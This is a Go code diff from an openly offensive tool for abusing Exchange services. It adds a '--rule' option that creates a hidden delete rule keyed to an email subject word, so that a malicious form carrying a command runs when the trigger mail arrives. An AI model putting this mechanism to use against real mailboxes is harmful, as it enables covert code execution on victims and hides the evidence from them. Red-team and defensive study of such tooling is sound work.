@@ -508,6 +508,20 @@ func createForm(c *cli.Context) error {
 	if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
 		return err
 	}
+	utils.Info.Println("Form created successfully")
+
+	if c.Bool("rule") == true {
+		rname := utils.GenerateString(6)
+		utils.Info.Printf("Rule trigger set. Adding new rule with name %s\n", rname)
+		triggerword := strings.Split(c.String("subject"), " ")[0]
+		utils.Info.Printf("Adding new rule with trigger of %s\n", triggerword)
+		//create delete rule
+		if _, err := mapi.ExecuteDeleteRuleAdd(rname, triggerword); err != nil {
+			utils.Error.Println("Failed to create the trigger rule")
+		} else {
+			utils.Info.Println("Trigger rule created.")
+		}
+	}
 
 	//trigger the email if the send option is enabled
 	if c.Bool("send") == true {
@@ -918,6 +932,10 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 						cli.BoolFlag{
 							Name:  "send,s",
 							Usage: "Trigger the form once it's been created.",
+						},
+						cli.BoolFlag{
+							Name:  "rule,r",
+							Usage: "Trigger the form with a rule. This will add a new rule!",
 						},
 						cli.StringFlag{
 							Name:  "body,b",
